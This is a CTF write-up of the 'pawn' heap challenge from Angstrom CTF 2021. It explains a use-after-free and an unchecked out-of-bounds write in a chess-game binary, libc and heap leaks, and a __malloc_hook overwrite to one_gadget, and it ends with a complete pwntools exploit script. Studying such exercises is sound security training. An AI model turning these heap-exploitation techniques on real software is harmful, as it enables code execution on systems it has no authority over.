---
title: Pawn - Angstrom CTF 2021
date: 2021-04-08 12:00:00
tags:
  - Linux
  - Exploitation
  - Heap
---

Angstrom CTF had a great collection of pwn challenges, ranging from easy to fairly challenging. Here's my writeup for `pawn`, a challenge which we were one of the first teams to solve, and our exploit is pretty unique.

**tl;dr**
+ UAF in chess game, overwrite `__malloc_hook` to `one_gadget`

## Initial analysis

We were given an `x86_64` binary, along with `libc-2.31`. The mitigations enabled were as follows:

```text
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

On analysing the binary, you could quickly realise that it was a chess game with 5 options - to add a board (with a maximum of 5 boards), print a board, move a piece, smite a piece, and delete a board.

```text
d4rk_kn1gh7 @ BatMobile  ./pawn
What would you like to do?
1) New Board
2) Print Board
3) Move Piece
4) Smite Piece
5) Delete Board
```

## Reversing & Vulnerabilities

On reversing the binary, we found out that each chess board was stored on the heap in the form of two chunks each of size `0x51`, one containing pointers to the start of each row of the board (which was used in the `print` option), and one containing the actual chess board itself (where we could `move` and `smite` pieces). 

A sample board on the heap looked like:
```text
00:0000│   0x405660 ◂— 0x0
01:0008│   0x405668 ◂— 0x51 /* 'Q' */
02:0010│   0x405670 —▸ 0x4056c0 ◂— 'RNBKQBNR'
03:0018│   0x405678 —▸ 0x4056c9 ◂— 'PPPPPPPP'
04:0020│   0x405680 —▸ 0x4056d2 ◂— '........'
05:0028│   0x405688 —▸ 0x4056db ◂— '........'
06:0030│   0x405690 —▸ 0x4056e4 ◂— '........'
07:0038│   0x405698 —▸ 0x4056ed ◂— '........'
08:0040│   0x4056a0 —▸ 0x4056f6 ◂— 'pppppppp'
09:0048│   0x4056a8 —▸ 0x4056ff ◂— 'rnbkqbnr'
0a:0050│   0x4056b0 ◂— 0x0
0b:0058│   0x4056b8 ◂— 0x51 /* 'Q' */
0c:0060│   0x4056c0 ◂— 'RNBKQBNR'
0d:0068│   0x4056c8 ◂— 0x5050505050505000
0e:0070│   0x4056d0 ◂— 0x2e2e2e2e2e2e0050 /* 'P' */
0f:0078│   0x4056d8 ◂— 0x2e2e2e2e2e002e2e /* '..' */
10:0080│   0x4056e0 ◂— 0x2e2e2e2e002e2e2e /* '...' */
11:0088│   0x4056e8 ◂— 0x2e2e2e002e2e2e2e /* '....' */
12:0090│   0x4056f0 ◂— 0x7070002e2e2e2e2e /* '.....' */
13:0098│   0x4056f8 ◂— 0x7200707070707070 /* 'pppppp' */
14:00a0│   0x405700 ◂— 0x726e62716b626e /* 'nbkqbnr' */
```

As you can see, the first chunk contains pointers to each row, and the second is the actual board itself (even though each row is 8 bytes, it is a bit asymmetric as there's a null byte after each row, to make the `print` function work properly, that's why there exists a separate chunk containing pointers).

The first vulnerability (and the most obvious one) was that it contained a UAF, i.e there was no check whether a particular board was in use or free, thus the path to exploitation was pretty clear - try to overwrite tcache fd with something like `malloc hook` or `free hook`, and get allocation there. 

However, a big problem was that we had no user input on the heap, i.e the only control we had over the heap was to `move` and `smite` pieces. This took us to reversing the `move` and `smite` functions. The `smite` function a simple one, which was as follows:

```c
int smite_piece(char** board, int x, int y) {
    if (is_letter(board[y][x])) {
        board[y][x] = mov_count;
        return 0;
    }
    return 1;
}
```

It checks if `board[y][x]` is a letter, and if it is, it overwrites it with `mov_count`, where `mov_count` is a byte containing the number of moves made upto that point. But a major bug here was that there was no check on `x` and `y`, thus writing `mov_count` anywhere, provided it was a letter. Now this was a clear write primitive, and we had control over the number of bytes moved, thus control over the value written.

Now this theoretically was enough to exploit it (as most other teams did). You could brute for a heap address to consist entirely of only letters, and thus be able to overwrite each byte of that heap address. However there was no guarantee that this would happen, so I found another vulnerability.

The `move` function was a bit compilicated, but in short, it emulated chess moves. It took two pairs of indices as input, a source and a destination. It first checked if the value at the source indices was a letter, then checked if the particular piece at that location was eligible to move to the destination indices (based on chess rules). This again had no check on the input index, so we could move a piece out of bounds.

## Exploitation

Now that we had enough bugs to exploit this properly, we can move on to the actual exploit. The first step was to get leaks. A heap leak could be easily achieved by abusing the UAF, and allocating then freeing two chunks. When we `print` the second chunk it gives us a tcache fd pointer, which is our heap leak.

Getting a libc leak was a bit more complicated. My idea was to overwrite one of the pointers in a pointer chunk with a resolved `GOT` address (as there was no PIE), thus `print`ing the board would leak a libc address. We could hope that the heap addresses would contain only letters and try `smite` directly to overwrite it to got, but I did this entirely with the `move` option, moving chess pieces to that pointer, guaranteeing that it would contain only letters, thus it could be `smite`d. I did this by moving the rook, king, and the second rook on the last row of a board (unfortunately there were no moves implemented for the queen) to the first pointer on the next pointer chunk. Also for this, we needed to make sure these moves could be made, so we needed to first clear out all the pawns, knights and bishops in the way, then move the rooks and king.

The following is how a sample pointer chunk looked after overwriting the first pointer with our two rooks and a king:

```
00:0000│   0xd8e490 ◂— 0x726b72 /* 'rkr' */
01:0008│   0xd8e498 —▸ 0xd8e4e9 ◂— 'PPPPPPPP'
02:0010│   0xd8e4a0 —▸ 0xd8e4f2 ◂— '........'
03:0018│   0xd8e4a8 —▸ 0xd8e4fb ◂— '........'
04:0020│   0xd8e4b0 —▸ 0xd8e504 ◂— '........'
05:0028│   0xd8e4b8 —▸ 0xd8e50d ◂— '........'
06:0030│   0xd8e4c0 —▸ 0xd8e516 ◂— 'pppppppp'
07:0038│   0xd8e4c8 —▸ 0xd8e51f ◂— 'rnbkqbnr'
```

Now we were guaranteed to have all the bytes be a letter, so `smite` was guaranteed to work on these bytes. We could use `smite` to overwrite the pointer to a `GOT` address byte-by-byte (you could manipulate the `mov_count` by just moving a bishop back and forth). Once this was done, we could `print` the board whose pointer we overwrote, to leak libc.

```
00:0000│   0xd8e490 —▸ 0x403f98 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fc273c6f850 (free)
01:0008│   0xd8e498 —▸ 0xd8e4e9 ◂— 'PPPPPPPP'
02:0010│   0xd8e4a0 —▸ 0xd8e4f2 ◂— '........'
03:0018│   0xd8e4a8 —▸ 0xd8e4fb ◂— '........'
04:0020│   0xd8e4b0 —▸ 0xd8e504 ◂— '........'
05:0028│   0xd8e4b8 —▸ 0xd8e50d ◂— '........'
06:0030│   0xd8e4c0 —▸ 0xd8e516 ◂— 'pppppppp'
07:0038│   0xd8e4c8 —▸ 0xd8e51f ◂— 'rnbkqbnr'
```

After this, the rest of the exploit was fairly straightforward. However there was a bit of a catch. The `pointer` chunks got allocated and freed first, and it was significantly easier to overwrite the `fd` of a board chunk. But if we overwrote the fd of a `board` chunk, the allocation we got would be that of a `pointer` chunk, which we had no control over. So we overwrote the size of a pointer chunk to `0xa1` (the normal size was 0x51) using `smite`, thus we could get a freed board chunk back on an even numbered allocation. Following this, the exploit was simple - overwriting a board chunk fd with malloc hook byte-by-byte (using `smite`), getting a board allocated there, then overwriting the first 8 bytes of that board with `one_gadget`. 

```
00:0000│   0x7fd97b5e9b70 (__malloc_hook) —▸ 0x7fd97b4e4c81 (execvpe+641)
01:0008│   0x7fd97b5e9b78 ◂— 0x2e2e2e2e2e2e2e00
02:0010│   0x7fd97b5e9b80 ◂— 0x2e2e2e2e2e2e002e /* '.' */
03:0018│   0x7fd97b5e9b88 ◂— 0x2e2e2e2e2e002e2e /* '..' */
04:0020│   0x7fd97b5e9b90 ◂— 0x2e2e2e2e002e2e2e /* '...' */
05:0028│   0x7fd97b5e9b98 ◂— 0x2e2e2e002e2e2e2e /* '....' */
06:0030│   0x7fd97b5e9ba0 ◂— 0x2e2e002e2e2e2e2e /* '.....' */
07:0038│   0x7fd97b5e9ba8 ◂— 0x72002e2e2e2e2e2e /* '......' */
08:0040│   0x7fd97b5e9bb0 ◂— 0x726e62716b626e /* 'nbkqbnr' */
```

After this, calling `malloc` again gave us a shell!

## Exploit script

```python
#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'shell.actf.co', 21706
binary = './pawnmod'
brkpts = '''
'''

elf = ELF("pawnmod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla("Delete Board\n", str(idx))

def add(idx):
    choice(1)
    sla("index?\n", str(idx))

def view(idx):
    choice(2)
    sla("index?\n", str(idx))

def move(idx, a1, a2, b1, b2):
    choice(3)
    sla("index?\n", str(idx))
    sla("spaces.\n", str(a1)+" "+str(a2))
    sla("spaces.\n", str(b1)+" "+str(b2))
    global mov_count
    if "Invalid" not in rl():
        mov_count = mov_count + 1

def move_x(idx, lane, src, dest):
    global mov_count
    while src > dest:
        choice(3)
        sla("index?\n", str(idx))
        sla("spaces.\n", str(lane)+" "+str(src))
        sla("spaces.\n", str(lane)+" "+str(src-1))
        src = src - 1
        if "Invalid" not in rl():
            mov_count = mov_count + 1

def move_y(idx, src, dest, lane):
    global mov_count
    while src < dest:
        choice(3)
        sla("index?\n", str(idx))
        sla("spaces.\n", str(src)+" "+str(lane))
        sla("spaces.\n", str(src+1)+" "+str(lane))
        src = src + 1
        if "Invalid" not in rl():
            mov_count = mov_count + 1

def smite(idx, a1, a2):
    choice(4)
    sla("index?\n", str(idx))
    sla("spaces.\n", str(a1)+" "+str(a2))

def free(idx):
    choice(5)
    sla("index?\n", str(idx))

def move_bishop(idx):
    global even
    if even:
        even = False
        move(idx, 6, 6, 5, 7)
    else:
        even = True
        move(idx, 5, 7, 6, 6)

def getvals(val):
    a = hex(val)
    out = []
    out.append(int("0x"+a[-2:], 16))
    for j in range(-2, -11, -2):
        out.append(int("0x"+a[j-2:j], 16))
    return out
    
global mov_count
global even

if __name__ == "__main__":
    mov_count = 0
    even = True
    add(0)
    add(1)
    add(2)
    add(3)
    add(4)
    free(1)
    free(0)
    view(0)
    rl()
    rl()
    leak = rl()[2:].replace("\n","")
    assert len(leak) == 3
    heap = uu64(leak) - 0x1350
    log.info("Heap -> "+hex(heap))

    move_y(2, 7, 19, 7) #rook -> (19, 7)
    move(2, 6, 7, 7, 5) #knight -> (7, 5)
    move(2, 6, 6, 6, 5) #pawn -> (6, 5)
    move(2, 5, 7, 6, 6) #bishop -> (6, 6)

    #Move king
    move(2, 4, 6, 4, 5)
    move(2, 3, 7, 4, 6) 
    move(2, 4, 6, 5, 7)

    move_y(2, 5, 18, 7) #king -> (18, 7)

    #Pawn clear
    move(2, 5, 6, 5, 5)
    move(2, 3, 6, 3, 5)
    move(2, 2, 6, 2, 5)
    move(2, 1, 6, 1, 5)
    move(2, 0, 6, 0, 5)

    #Move rook
    move(2, 0, 7, 0, 6)
    move(2, 0, 6, 5, 6)
    move(2, 5, 6, 5, 7)
    move_y(2, 5, 17, 7) #rook -> (17, 7)


    #Overwrite pointer to GOT
    while mov_count < 0x3f:
        move_bishop(2)
    smite(2, 18, 7)
    
    move_bishop(2)
    smite(2, 19, 7)
    while mov_count < 0x98:
        move_bishop(2)
    smite(2, 17, 7)

    view(3)
    rl()
    rl()
    libc.address = uu64(rl()[2:].replace("\n","")) - libc.symbols['free']
    log.info("Libc -> "+hex(libc.address))
    malloc_hook = libc.symbols["__malloc_hook"]
    gadget = libc.address + [0xe6c7e, 0xe6c81, 0xe6c84][1]

    add(0)
    add(1)
    move_y(3, 7, 9, 7)
    while mov_count < 0xa1:
        move_bishop(2)
    smite(3, 9, 7)

    free(1)
    free(0)
    free(4)

    for i in range(6):
        move_x(0, i, 6, 0)

    #Overwrite tcache fd to malloc_hook
    vals = getvals(malloc_hook)

    for idx, i in enumerate(vals):
        count = int("0x"+hex(mov_count)[-2:], 16)
        if count < i:
            while count < i:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            smite(0, idx, 0)
        else:
            while count != 0:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            while count < i:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            smite(0, idx, 0)

    add(1)
    add(0)

    for i in range(8):
        move_x(0, i, 6, 0)
    
    #Overwrite malloc_hook to one_gadget
    vals = getvals(gadget)

    for idx, i in enumerate(vals):
        count = int("0x"+hex(mov_count)[-2:], 16)
        if count < i:
            while count < i:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            smite(0, idx, 0)
        else:
            while count != 0:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            while count < i:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            smite(0, idx, 0)

    while count != 0:
        move_bishop(2)
        count = int("0x"+hex(mov_count)[-2:], 16)
    smite(0, 6, 0)
    smite(0, 7, 0)

    #Call malloc to get shell!
    add(0)
    
    io.interactive()
```

## Flag

```console
d4rk_kn1gh7 @ BatMobile  python exp.py
$ cat flag.txt
actf{thatll_shut_the_freshmen_up}
```
